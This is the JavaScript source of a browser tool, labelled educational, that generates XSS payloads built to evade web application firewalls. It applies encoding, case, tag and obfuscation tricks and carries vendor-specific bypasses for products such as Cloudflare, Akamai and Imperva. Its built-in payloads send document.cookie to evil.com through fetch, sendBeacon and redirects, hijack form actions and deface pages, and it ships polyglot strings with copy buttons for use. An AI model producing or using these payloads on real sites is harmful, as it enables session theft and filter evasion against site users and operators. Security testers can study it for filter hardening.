/**
 * WAF Bypass Mutation Tool - Modern JS implementation
 * For educational purposes only
 */

// DOM Elements
const originalPayloadEl = document.getElementById('original-payload');
const mutateBtn = document.getElementById('mutate-btn');
const copyAllBtn = document.getElementById('copy-all-btn');
const mutationsList = document.getElementById('mutations-list');
const mutationCount = document.getElementById('mutation-count');

// Real-time engine elements
const wafTypeEl = document.getElementById('waf-type');
const payloadIntentEl = document.getElementById('payload-intent');
const aggressivenessEl = document.getElementById('ai-aggressiveness');
const realtimeGenerateBtn = document.getElementById('realtime-generate-btn');
const realtimeResultEl = document.getElementById('realtime-result');
const wafAnalysisEl = document.getElementById('waf-analysis');

// Utility Functions
const escapeHTML = (str) => {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(
        () => {
            showCopySuccess();
        },
        (err) => {
            console.error('Failed to copy text: ', err);
        }
    );
};

const showCopySuccess = () => {
    // Create and show a temporary floating message
    const message = document.createElement('div');
    message.textContent = 'Copied to clipboard!';
    message.style.position = 'fixed';
    message.style.bottom = '20px';
    message.style.right = '20px';
    message.style.padding = '10px 20px';
    message.style.background = 'var(--primary)';
    message.style.color = 'white';
    message.style.borderRadius = 'var(--radius-md)';
    message.style.boxShadow = 'var(--shadow-md)';
    message.style.zIndex = '1000';
    message.style.opacity = '0';
    message.style.transform = 'translateY(10px)';
    message.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
    
    document.body.appendChild(message);
    
    // Trigger animation
    setTimeout(() => {
        message.style.opacity = '1';
        message.style.transform = 'translateY(0)';
    }, 10);
    
    // Remove after 2 seconds
    setTimeout(() => {
        message.style.opacity = '0';
        message.style.transform = 'translateY(10px)';
        setTimeout(() => document.body.removeChild(message), 300);
    }, 2000);
};

// Mutation Functions
const generateMutations = (payload) => {
    if (!payload.trim()) {
        showError('Please enter a valid payload');
        return [];
    }
    
    const count = parseInt(mutationCount.value, 10);
    const mutations = [];
    
    // Get selected mutation techniques
    const useCaseVariations = document.getElementById('mut-case').checked;
    const useHtmlEncoding = document.getElementById('mut-encoding').checked;
    const useTagVariations = document.getElementById('mut-tags').checked;
    const useQuoteVariations = document.getElementById('mut-quotes').checked;
    const useSpaceVariations = document.getElementById('mut-spaces').checked;
    const useObfuscation = document.getElementById('mut-obfuscation').checked;
    
    // Generate mutations based on selected techniques
    for (let i = 0; i < count; i++) {
        let mutated = payload;
        
        // Apply selected mutation techniques
        if (useCaseVariations) mutated = applyCaseVariation(mutated, i);
        if (useHtmlEncoding) mutated = applyHtmlEncoding(mutated, i);
        if (useTagVariations) mutated = applyTagVariation(mutated, i);
        if (useQuoteVariations) mutated = applyQuoteVariation(mutated, i);
        if (useSpaceVariations) mutated = applySpaceVariation(mutated, i);
        if (useObfuscation) mutated = applyObfuscation(mutated, i);
        
        mutations.push(mutated);
    }
    
    return [...new Set(mutations)]; // Remove duplicates
};

const applyCaseVariation = (payload, seed) => {
    // Mix uppercase and lowercase characters
    if (seed % 3 === 0) {
        return payload.replace(/[a-zA-Z]/g, (char) => 
            Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
        );
    } else if (seed % 3 === 1) {
        return payload.replace(/script/gi, (match) => 
            match.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('')
        );
    } else {
        return payload.replace(/alert|confirm|prompt|eval|document|window/gi, (match) => 
            match.split('').map((c, i) => i % 2 === 1 ? c.toUpperCase() : c.toLowerCase()).join('')
        );
    }
};

const applyHtmlEncoding = (payload, seed) => {
    const encodings = [
        // HTML entity encoding
        { from: '<', to: '&lt;' },
        { from: '>', to: '&gt;' },
        // URL encoding
        { from: '<', to: '%3C' },
        { from: '>', to: '%3E' },
        // Hex encoding
        { from: '<', to: '&#x3c;' },
        { from: '>', to: '&#x3e;' },
        // Unicode
        { from: '<', to: '\\u003c' },
        { from: '>', to: '\\u003e' },
    ];
    
    // Only encode some characters based on seed
    if (seed % 3 === 0) {
        return payload
            .replace(/</g, encodings[seed % 3 * 2].to)
            .replace(/>/g, encodings[seed % 3 * 2 + 1].to);
    } else if (seed % 3 === 1) {
        return payload
            .replace(/document/g, 'd\\u006fcument')
            .replace(/window/g, 'win\\u0064ow');
    } else {
        return payload
            .replace(/alert/g, 'al\\u0065rt')
            .replace(/eval/g, '\\u0065val');
    }
};

const applyTagVariation = (payload, seed) => {
    const tagVariations = [
        { from: '<script', to: '<sCrIpT' },
        { from: '<script', to: '<ScRiPt' },
        { from: '<script', to: '<svg/onload' },
        { from: '<script', to: '<img/onerror' },
        { from: '<script', to: '<iframe/onload' },
        { from: '<script', to: '<div/onmouseover' },
    ];
    
    const selectedVariation = tagVariations[seed % tagVariations.length];
    return payload.replace(new RegExp(selectedVariation.from, 'gi'), selectedVariation.to);
};

const applyQuoteVariation = (payload, seed) => {
    const quoteVariations = [
        { from: '"', to: "'" },
        { from: "'", to: "`" },
        { from: '"', to: "`" },
        { from: "'", to: '"' },
    ];
    
    if (seed % 2 === 0) {
        const selectedVariation = quoteVariations[seed % quoteVariations.length];
        return payload.replace(new RegExp(selectedVariation.from, 'g'), selectedVariation.to);
    } else {
        // Try to replace quoted event handler
        return payload.replace(/on\w+="([^"]+)"/g, (match, p1) => `on${match.split('=')[0].substring(2)}='${p1}'`);
    }
};

const applySpaceVariation = (payload, seed) => {
    const spaceVariations = [
        { from: ' ', to: '\t' },
        { from: ' ', to: '\n' },
        { from: ' ', to: '\r' },
        { from: ' ', to: '+' },
        { from: ' ', to: '%20' },
        { from: ' ', to: '/**/'},
    ];
    
    if (seed % 3 === 0) {
        const selectedVariation = spaceVariations[seed % spaceVariations.length];
        return payload.replace(/ /g, selectedVariation.to);
    } else if (seed % 3 === 1) {
        // Remove spaces between certain elements
        return payload.replace(/> </g, '><');
    } else {
        // Add extra spaces
        return payload.replace(/([=:;])/g, ' $1 ');
    }
};

const applyObfuscation = (payload, seed) => {
    const obfuscations = [
        { from: 'alert', to: 'a\u200Blert'},
        { from: 'alert', to: '(alert)'},
        { from: 'alert', to: '["ale"+"rt"]'},
        { from: 'alert', to: 'window["al"+"ert"]'},
        { from: 'document.cookie', to: 'document["cookie"]'},
        { from: 'document.cookie', to: 'document[atob("Y29va2ll")]'},
        { from: 'alert(', to: 'setTimeout("alert("},
        { from: 'eval(', to: '[].find.constructor("eval($1)")()'}
    ];
    
    if (seed % 4 === 0) {
        const selectedObfuscation = obfuscations[seed % obfuscations.length];
        return payload.replace(new RegExp(selectedObfuscation.from, 'g'), selectedObfuscation.to);
    } else if (seed % 4 === 1) {
        // Base64 encode certain parts
        return payload.replace(/(alert\([^)]+\))/g, (match) => {
            return `eval(atob('${btoa(match)}'))`;
        });
    } else if (seed % 4 === 2) {
        // JavaScript Unicode escaping
        return payload.replace(/[a-z]{4,8}/gi, (match) => {
            if (['alert', 'eval', 'document', 'cookie', 'window'].includes(match.toLowerCase())) {
                return match.split('').map(c => `\\u${('000' + c.charCodeAt(0).toString(16)).slice(-4)}`).join('');
            }
            return match;
        });
    } else {
        // Comment insertion
        return payload.replace(/([=:(])/g, '$1/*random*/');
    }
};

// Display Functions
const displayMutations = (mutations) => {
    if (!mutations.length) {
        mutationsList.innerHTML = '<p class="empty-message">No mutations generated. Try a different payload.</p>';
        return;
    }
    
    mutationsList.innerHTML = '';
    
    mutations.forEach((mutation, index) => {
        const item = document.createElement('div');
        item.className = 'mutation-item';
        
        // Create pre element for the payload
        const pre = document.createElement('pre');
        pre.textContent = mutation;
        
        // Create copy button
        const copyBtn = document.createElement('button');
        copyBtn.className = 'copy-mutation';
        copyBtn.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
            </svg>
        `;
        copyBtn.title = "Copy to clipboard";
        copyBtn.onclick = (e) => {
            e.stopPropagation();
            copyToClipboard(mutation);
        };
        
        // Append elements
        item.appendChild(pre);
        item.appendChild(copyBtn);
        mutationsList.appendChild(item);
    });
};

const showError = (message) => {
    const errorEl = document.createElement('div');
    errorEl.className = 'error-message';
    errorEl.innerHTML = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"/>
            <line x1="12" y1="8" x2="12" y2="12"/>
            <line x1="12" y1="16" x2="12" y2="16"/>
        </svg>
        ${message}
    `;
    
    mutationsList.innerHTML = '';
    mutationsList.appendChild(errorEl);
};

const showLoading = (element) => {
    element.innerHTML = `
        <div class="generating">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="12" y1="2" x2="12" y2="6"/>
                <line x1="12" y1="18" x2="12" y2="22"/>
                <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/>
                <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/>
                <line x1="2" y1="12" x2="6" y2="12"/>
                <line x1="18" y1="12" x2="22" y2="12"/>
                <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/>
                <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/>
            </svg>
            Generating payloads...
        </div>
    `;
};

// Real-time engine functions
const generateAdvancedPayloads = () => {
    const wafType = wafTypeEl.value;
    const payloadIntent = payloadIntentEl.value;
    const aggressiveness = aggressivenessEl.value;
    
    const polyglotMode = document.getElementById('polyglot-mode').checked;
    const signatureEvasion = document.getElementById('signature-evasion').checked;
    const contextAware = document.getElementById('context-aware').checked;
    const entropyInjection = document.getElementById('entropy-injection').checked;
    
    showLoading(realtimeResultEl);
    
    // Simulate advanced processing with setTimeout
    setTimeout(() => {
        const payloads = generateWafBypassPayloads(wafType, payloadIntent, aggressiveness, {
            polyglotMode,
            signatureEvasion,
            contextAware,
            entropyInjection
        });
        
        displayRealtimeResults(payloads);
        displayWafAnalysis(wafType, payloadIntent, aggressiveness);
    }, 1500);
};

const generateWafBypassPayloads = (wafType, payloadIntent, aggressiveness, options) => {
    const payloads = [];
    const count = 3 + parseInt(aggressiveness, 10);
    
    // Base payloads by intent
    let basePayloads = [];
    
    switch (payloadIntent) {
        case 'alert':
            basePayloads = ['<script>alert(1)</script>', 'javascript:alert(1)', '<img src=x onerror=alert(1)>'];
            break;
        case 'cookie':
            basePayloads = ['<script>fetch(`https://evil.com?c=${document.cookie}`)</script>', '<img src=x onerror="location=`https://evil.com?c=${btoa(document.cookie)}`">'];
            break;
        case 'redirect':
            basePayloads = ['<script>location="https://evil.com"</script>', '<meta http-equiv="refresh" content="0;url=https://evil.com">'];
            break;
        case 'fetch':
            basePayloads = ['<script>fetch("https://evil.com",{method:"POST",body:document.cookie})</script>', '<script>navigator.sendBeacon("https://evil.com",document.cookie)</script>'];
            break;
        case 'eval':
            basePayloads = ['<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))</script>', '<script>setTimeout`alert\x28document.domain\x29`</script>'];
            break;
        case 'dom':
            basePayloads = ['<script>document.body.innerHTML="<div>Site hacked</div>"</script>', '<script>document.querySelector("form").action="https://evil.com"</script>'];
            break;
        default:
            basePayloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'];
    }
    
    // Specific WAF bypass techniques
    const wafBypassTechniques = {
        cloudflare: ['\\', 'newline bypasses', 'double encoding', 'HTML comments'],
        akamai: ['parameter pollution', 'path traversal', 'mixed case encoding'],
        imperva: ['charset obfuscation', 'HTML entities', 'junk injection'],
        f5: ['filter evasion', 'string splitting', 'multi-encoding'],
        aws: ['null byte injection', 'multi-layer encoding', 'protocol obfuscation'],
        modsecurity: ['backslash escaping', 'parameter fragmentation', 'engine confusion'],
        fortinet: ['regex bypassing', 'embedded nulls', 'comment injection'],
        generic: ['multi-reflection', 'unicode normalization', 'tag obfuscation']
    };
    
    // Apply techniques based on WAF type
    for (let i = 0; i < count; i++) {
        const basePayload = basePayloads[i % basePayloads.length];
        let mutations = [];
        
        // Apply WAF-specific bypasses
        if (options.signatureEvasion) {
            mutations.push(...wafSpecificMutations(basePayload, wafType, i));
        }
        
        // Apply polyglot techniques if enabled
        if (options.polyglotMode && i % 2 === 0) {
            mutations.push(generatePolyglot(basePayload, wafType));
        }
        
        // Apply context-aware mutations if enabled
        if (options.contextAware) {
            mutations.push(contextAwareMutation(basePayload, i));
        }
        
        // Apply entropy injection if enabled
        if (options.entropyInjection) {
            mutations.push(injectEntropy(basePayload, parseInt(aggressiveness, 10)));
        }
        
        // Default mutations if none applied
        if (mutations.length === 0) {
            mutations.push(applyGenericBypass(basePayload, i));
        }
        
        // Add all relevant mutations
        payloads.push(...mutations);
    }
    
    // Remove duplicates and limit count
    return [...new Set(payloads)].slice(0, count);
};

const wafSpecificMutations = (payload, wafType, seed) => {
    switch (wafType) {
        case 'cloudflare':
            return [
                payload.replace(/<script/i, '<ScRiPt\\x20'),
                payload.replace(/<script/i, '<!--><script'),
                payload.replace(/alert/g, 'al\\u0065rt')
            ];
        case 'akamai':
            return [
                payload.replace(/=/g, '%3D').replace(/"/g, '%22'),
                payload.replace(/<script/i, '<script%09'),
                payload.replace(/alert/g, 'window["a"+"l"+"e"+"r"+"t"]')
            ];
        case 'imperva':
            return [
                payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&lt;script&gt;/gi, '<script>'),
                payload.replace(/<script/i, '<script id="a" \x00'),
                payload.replace(/alert/g, 'confirm')
            ];
        case 'f5':
            return [
                payload.replace(/script/g, 'scri\\pt'),
                payload.replace(/alert/g, '\\u0061lert'),
                payload.replace(/<script/i, '<script x=')
            ];
        case 'aws':
            return [
                payload.replace(/</g, '%uff1c'),
                payload.replace(/alert/g, 'al\u0000ert'),
                payload.replace(/on\w+=/g, (match) => `on${match.slice(2, -1).toUpperCase()}=`)
            ];
        case 'modsecurity':
            return [
                payload.replace(/alert/g, 'a\\l\\e\\r\\t'),
                payload.replace(/</g, '<%00'),
                payload.replace(/on\w+=/g, 'data-x=this.')
            ];
        case 'fortinet':
            return [
                payload.replace(/script/g, '`script`'),
                payload.replace(/</g, '<!----><'),
                payload.replace(/alert/g, 'this["alert"]')
            ];
        default:
            return [
                payload.replace(/alert/g, 'al\u200cert'),
                payload.replace(/</g, '<%09'),
                payload.replace(/script/g, 'scrscriptipt')
            ];
    }
};

const generatePolyglot = (payload, wafType) => {
    const polyglots = [
        'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
        '\'">><marquee><img src=x onerror=confirm(1)></marquee>">',
        '</script><script>alert(1)</script>',
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+document.location=`//evil.com`//\'>'
    ];
    
    const basePolyglot = polyglots[Math.floor(Math.random() * polyglots.length)];
    
    // Insert the payload intent into the polyglot
    if (payload.includes('alert')) {
        return basePolyglot;
    } else {
        // Extract the action from the payload
        const action = payload.match(/alert|fetch|location|eval|innerHTML/) || ['alert'];
        return basePolyglot.replace(/alert|confirm/, action[0]);
    }
};

const contextAwareMutation = (payload, seed) => {
    const contexts = [
        // HTML attribute context
        { detector: 'src=', mutator: (p) => p.replace(/alert\(/g, 'location=javascript:alert(').replace(/\)/g, ')//') },
        // JS string context
        { detector: '<script>', mutator: (p) => p.replace(/<script>/g, '<script>"/"+') },
        // URL context
        { detector: 'javascript:', mutator: (p) => p.replace(/javascript:/g, 'javascript:void/**/') },
        // HTML context
        { detector: '<img', mutator: (p) => p.replace(/<img/g, '<style>@keyframes x{}</style><img') },
        // Generic
        { detector: '', mutator: (p) => p.replace(/<sc/g, '<paramater name=x onload=eval name>sc') }
    ];
    
    // Find applicable context
    for (const context of contexts) {
        if (payload.includes(context.detector) || context.detector === '') {
            return context.mutator(payload);
        }
    }
    
    return payload;
};

const injectEntropy = (payload, level) => {
    // Add random noise based on aggressiveness level
    let result = payload;
    
    // Add random attributes
    if (level > 2 && payload.includes('<')) {
        const randomAttr = ` data-${Math.random().toString(36).substring(2, 8)}="${Math.random().toString(36).substring(2, 8)}"`;
        result = result.replace(/(<[a-z]+)([\s>])/gi, `$1${randomAttr}$2`);
    }
    
    // Add timing delays for higher levels
    if (level > 3 && payload.includes('script')) {
        result = result.replace(/(alert|confirm|fetch|eval)\(/g, 
            `setTimeout(function(){$1(`)
            .replace(/\)$/g, `)}, ${Math.floor(Math.random() * 100)})`);
    }
    
    // Add entropy to event handlers
    if (level > 1 && payload.includes('on')) {
        result = result.replace(/on(\w+)=/g, 
            `data-event=${Math.random().toString(36).substring(2, 5)} on$1=`);
    }
    
    return result;
};

const applyGenericBypass = (payload, seed) => {
    const bypasses = [
        (p) => p.replace(/</g, '<').replace(/>/g, '>'),
        (p) => p.replace(/script/g, 's\tcript'),
        (p) => p.replace(/alert/g, 'al\u200Bert'),
        (p) => p.replace(/</g, '\u00ad<'),
        (p) => p.replace(/<script/g, '<\0script'),
        (p) => p.replace(/>/g, `><!--${Math.random().toString(36).substring(2, 8)}-->`)
    ];
    
    return bypasses[seed % bypasses.length](payload);
};

const displayRealtimeResults = (payloads) => {
    if (!payloads.length) {
        realtimeResultEl.innerHTML = '<p class="empty-message">No advanced payloads generated.</p>';
        return;
    }
    
    realtimeResultEl.innerHTML = '';
    
    payloads.forEach((payload, index) => {
        const item = document.createElement('div');
        item.className = 'realtime-payload';
        
        // Determine techniques used
        const techniques = [];
        if (payload.includes('\\u')) techniques.push('unicode');
        if (payload.includes('%')) techniques.push('url-encode');
        if (payload.includes('/*')) techniques.push('comments');
        if (payload.includes('`')) techniques.push('template');
        if (payload.includes('+/')) techniques.push('regex-bypass');
        if (payload.includes('\\x')) techniques.push('hex');
        
        // Add at least one technique if none detected
        if (techniques.length === 0) {
            techniques.push('basic');
        }
        
        // Create header with technique tags
        const header = document.createElement('div');
        header.className = 'realtime-payload-header';
        
        techniques.forEach(technique => {
            const tag = document.createElement('span');
            tag.className = 'technique-tag';
            tag.textContent = technique;
            header.appendChild(tag);
        });
        
        // Create content
        const content = document.createElement('div');
        content.className = 'realtime-payload-content';
        content.textContent = payload;
        
        // Create copy button
        const copyBtn = document.createElement('button');
        copyBtn.className = 'realtime-copy-btn';
        copyBtn.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
            </svg>
        `;
        copyBtn.title = "Copy to clipboard";
        copyBtn.onclick = (e) => {
            e.stopPropagation();
            copyToClipboard(payload);
        };
        
        // Append elements
        item.appendChild(header);
        item.appendChild(content);
        item.appendChild(copyBtn);
        realtimeResultEl.appendChild(item);
    });
};

const displayWafAnalysis = (wafType, payloadIntent, aggressiveness) => {
    const wafAnalysisContent = document.querySelector('#waf-analysis .analysis-content');
    const analysisScore = document.querySelector('#waf-analysis .analysis-score');
    
    // Generate analysis content based on selections
    let analysisText = '';
    
    switch (wafType) {
        case 'cloudflare':
            analysisText = `CloudFlare WAF is known for its sophisticated pattern matching and rate limiting. The generated payloads use several techniques including newline bypasses and double encoding which may evade signature-based detection. Effectiveness varies based on CloudFlare configuration.`;
            break;
        case 'akamai':
            analysisText = `Akamai WAF uses a rule-based approach for security. These payloads attempt to bypass detection through parameter pollution and mixed case encoding techniques. Higher aggressiveness levels have better chances against basic configurations.`;
            break;
        case 'imperva':
            analysisText = `Imperva WAF employs behavioral analytics and signature detection. The bypasses utilize charset obfuscation and HTML entity encoding to evade pattern matching. Consider testing with different mutation techniques for optimal results.`;
            break;
        default:
            analysisText = `Generic WAF bypass attempts use a combination of encoding techniques, tag obfuscation, and entropy injection. The effectiveness depends on the specific security implementation and configuration of the target system.`;
    }
    
    // Add intent-specific analysis
    analysisText += ` The ${payloadIntent} payloads are designed to specifically target functionality without triggering common filters for that behavior.`;
    
    // Display analysis
    wafAnalysisContent.innerHTML = `<p>${analysisText}</p>`;
    
    // Show score section
    analysisScore.style.display = 'flex';
    
    // Calculate scores based on selections
    const evasionBase = parseInt(aggressiveness, 10) * 10 + 40;
    const detectionBase = 90 - parseInt(aggressiveness, 10) * 10;
    const complexityBase = parseInt(aggressiveness, 10) * 15 + 25;
    
    // Apply WAF-specific adjustments
    let evasionScore = evasionBase;
    let detectionScore = detectionBase;
    let complexityScore = complexityBase;
    
    // Adjust based on WAF type
    switch (wafType) {
        case 'cloudflare':
            evasionScore -= 10;
            detectionScore += 15;
            break;
        case 'akamai':
            complexityScore += 10;
            break;
        case 'imperva':
            evasionScore -= 5;
            detectionScore += 10;
            break;
        case 'modsecurity':
            evasionScore += 5;
            break;
        case 'aws':
            detectionScore -= 5;
            break;
    }
    
    // Ensure scores are within bounds
    evasionScore = Math.min(Math.max(evasionScore, 10), 95);
    detectionScore = Math.min(Math.max(detectionScore, 10), 95);
    complexityScore = Math.min(Math.max(complexityScore, 10), 95);
    
    // Update score values
    document.querySelectorAll('.score-value')[0].textContent = evasionScore;
    document.querySelectorAll('.score-value')[1].textContent = detectionScore;
    document.querySelectorAll('.score-value')[2].textContent = complexityScore;
};

// Event Listeners
mutateBtn.addEventListener('click', () => {
    const originalPayload = originalPayloadEl.value.trim();
    
    if (!originalPayload) {
        showError('Please enter a valid payload');
        return;
    }
    
    showLoading(mutationsList);
    
    // Simulate processing with setTimeout
    setTimeout(() => {
        const mutations = generateMutations(originalPayload);
        displayMutations(mutations);
    }, 800);
});

copyAllBtn.addEventListener('click', () => {
    const mutations = Array.from(mutationsList.querySelectorAll('.mutation-item pre'))
        .map(pre => pre.textContent)
        .join('\n\n');
    
    if (mutations) {
        copyToClipboard(mutations);
    }
});

realtimeGenerateBtn.addEventListener('click', generateAdvancedPayloads);

// Initialize with sample data
document.addEventListener('DOMContentLoaded', () => {
    // Add sample payload if empty
    if (originalPayloadEl.value.trim() === '') {
        originalPayloadEl.value = '<script>alert(document.cookie)</script>';
    }
});